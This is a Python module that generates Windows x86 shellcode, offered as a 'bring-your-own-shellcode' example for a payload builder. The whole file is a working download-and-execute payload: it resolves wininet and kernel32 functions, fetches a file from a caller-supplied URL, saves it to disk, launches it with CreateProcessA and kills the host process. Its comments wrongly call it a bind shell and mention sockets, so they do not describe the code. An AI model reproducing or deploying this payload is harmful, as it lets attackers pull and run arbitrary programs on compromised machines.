"""Bring-your-own-shellcode example for ``shellcoder-v2.py --custom``.

This wrapper demonstrates the custom-module contract while reusing the
educational bind-shell builder as a starting point for further changes.
"""

from shellcode.payload_utils import (
  flatten_asm,
  format_shellcode_asm,
)
from shellcode.push_string import push_string
from shellcode.shellcode_helper import ShellcodeHelper

def internet_shellcode(remote_url, local_file_path, bad_bytes=None):
  """Return bind-shell assembly using the standard custom-module signature.

  """
  var = ShellcodeHelper(bad_bytes=bad_bytes)

  # Add functions
  f_term_process = "TerminateProcess" # kernel32.dll
  f_create_file = "CreateFileA" # kernel32.dll
  f_write_file = "WriteFile" # kernel32.dll
  f_create_process = "CreateProcessA"  # kernel32.dll
  f_close_handle = "CloseHandle"

  f_internet_open = "InternetOpenA" # wininet.dll
  f_internet_open_url = "InternetOpenUrlA" # wininet.dll
  f_internet_read_file = "InternetReadFile" # wininet.dll

  v_startup_info = "lpStartupInfo"
  v_proc_info = "lpProcessInformation"

  var.add(v_proc_info, reserve=0x20)
  var.add(v_startup_info, reserve=0x44)

  for function_name in (
        f_internet_open,
        f_internet_open_url,
        f_internet_read_file,
        f_create_file,
        f_write_file,
        f_term_process,
        f_create_process,
        f_close_handle
    ):
        var.add(function_name)

  # Add variables as needed
  v_internet_open_agent = "user_agent"
  v_internet_open_handle = "inet_handle"
  v_internet_open_url_handle = "inet_open_url_handle"
  v_file_handle = "file_handle"
  v_remote_url = "remote_url"
  v_local_file_path = "local_file_path"

  # BYTE buffer[1024];
  # DWORD bytesRead, bytesWritten;

  v_file_buffer = "buffer"
  v_bytes_read = "read"
  v_bytes_written = "write"

  var.add(v_remote_url)
  var.add(v_local_file_path)
  var.add(v_file_handle)
  var.add(v_internet_open_agent)
  var.add(v_internet_open_handle)
  var.add(v_internet_open_url_handle)
  var.add(v_bytes_read)
  var.add(v_bytes_written)
  var.add(v_file_buffer, reserve=1024)

  asm = [
    "start:",
    var.get_esp_setup()                    , # reserve scratch space for variables and temporary structures
    var.get_clear_variables()              , # zero the stack-backed variable area
    var.get_common_shellcode()             , # locate kernel32 and bootstrap resolver helpers

    "   resolve_symbols_kernel32: ",  # resolve APIs exported directly by kernel32
    var.find_function(f_term_process),
    var.find_function(f_create_file),
    var.find_function(f_write_file),
    var.find_function(f_create_process),
    var.find_function(f_close_handle),

    "   load_wininet:                         ",  # load winsock before resolving socket APIs
    var.load_library("wininet.dll"),

    "   resolve_symbols_wininet:         ",
    var.find_function(f_internet_open),
    var.find_function(f_internet_open_url),
    var.find_function(f_internet_read_file),

    "   create_user_agent:               ",
    push_string("Mozilla User Agent ...", target_reg="esi"),
    var.write_var(v_internet_open_agent, reg_src="esi"),

    "   call_internet_open:              ",
    "   xor eax, eax                     ",
    "   push eax                         ",
    "   push eax                         ",
    "   push eax                         ",
    "   inc eax                          ",
    "   push eax                         ",
    var.push_var_value(v_internet_open_agent, "ebx"),
    var.call_function(f_internet_open),
    var.write_var(v_internet_open_handle),

    "   create_remote_url:               ",
    push_string(remote_url, target_reg="esi"),
    var.write_var(v_remote_url, reg_src="esi"),

    "   call_internet_open_url:              ",
    "   xor eax, eax                     ",
    "   push eax                         ",
    "   mov eax, 0x3fffffff              ",
    "   inc eax                          ",
    "   push eax",
    "   xor eax, eax                     ",
    "   push eax                         ",
    "   push eax                         ",
    var.push_var_value(v_remote_url, "ebx"),
    var.push_var_value(v_internet_open_handle),
    var.call_function(f_internet_open_url),
    var.write_var(v_internet_open_url_handle),

    "   create_local_file_path:               ",
    push_string(local_file_path, target_reg="esi"),
    var.write_var(v_local_file_path, reg_src="esi"),

    "   call_create_file:                     ",
    "   xor eax, eax                     ",
    "   push eax                         ",
    "   mov al, 0x7f                     ",
    "   inc eax                          ",
    "   push eax                         ",        # FILE_ATTRIBUTE_NORMAL = 0x00000080
    "   xor eax, eax                     ",
    "   inc eax                          ",
    "   push eax                         ",        # CREATE_NEW = 1U,
    "   xor eax, eax                     ",
    "   push eax                         ",
    "   push eax                         ",
    "   inc eax                          ",
    "   inc eax                          ",
    "   inc eax                          ",
    "   push eax                         ",     # GENERIC_READ | GENERIC_WRITE
    var.push_var_value(v_local_file_path, "ebx"),
    var.call_function(f_create_file),
    var.write_var(v_file_handle),

    "   read_bytes:                      ",

    "   call_internet_read_file:         ",
    var.push_var_address(v_bytes_read),
    "   mov eax, 0xfffffc01              ",     # hex(-1024 + 1)
    "   neg eax                          ",     # -hex(-1024 + 1) = hex(1024 - 1)
    "   inc eax                          ",     # 1024
    "   push eax                         ",
    var.push_var_address(v_file_buffer),
    var.push_var_value(v_internet_open_url_handle),
    var.call_function(f_internet_read_file),
    var.read_var(v_bytes_read),

    "   test eax, eax                    ",
    "   je  call_close_handle            ",

    "   call_write_file:         ",
    "   xor eax, eax                     ",
    "   push eax                         ",
    var.push_var_address(v_bytes_written),
    var.push_var_value(v_bytes_read),
    var.push_var_address(v_file_buffer),
    var.push_var_value(v_file_handle),
    var.call_function(f_write_file),
    "   jmp read_bytes                    ",

    "   call_close_handle:                 ",
    var.push_var_value(v_file_handle),
    var.call_function(f_close_handle),

    "   create_startupinfoa:                 ",  # set cb and STARTF_USESTDHANDLES in STARTUPINFOA
    "       xor eax, eax                    ;",
    "       mov al, 0x44                    ;",
    var.write_var(v_startup_info, "eax", 0x00),  # offset 0x00: cb = sizeof(STARTUPINFOA)
    "       add al, 0xBB                    ;",  # eax = 0xFF
    "       inc eax                         ;",  # eax = 0x100
    var.write_var(v_startup_info, "eax", 0x2C),  # offset 0x2C: dwFlags = 0x100

    "   call_createprocessa:                 ",  # spawn cmd.exe with inherited stdio redirected to the socket
    var.push_var_address(v_proc_info),  # lpProcessInformation = ptr to v_proc_info
    var.push_var_address(v_startup_info),  # lpStartupInfo = ptr to v_startup_info
    "       xor eax, eax                    ;",
    "       push eax                        ;",  # lpCurrentDirectory = NULL
    "       push eax                        ;",  # lpEnvironment = NULL
    "       push eax                        ;",  # dwCreationFlags = NULL
    "       inc eax                         ;",  #
    "       push eax                        ;",  # bInheritHandles = TRUE
    "       dec eax                         ;",  #
    "       push eax                        ;",  # lpThreadAttributes = NULL
    "       push eax                        ;",  # lpProcessAttributes = NULL
    var.push_var_value(v_local_file_path, "ebx"),
    "       push eax                        ;",  # lpApplicationName = NULL
    var.call_function(f_create_process),

    "   exec_shellcode:                   ",  # terminate the original thread/process context after the child is created
        "       xor ecx, ecx             ;",
        "       push ecx                 ;",
        "       push 0xffffffff          ;",
        var.call_function(f_term_process),
  ]
  return format_shellcode_asm("\n".join(flatten_asm(asm)))
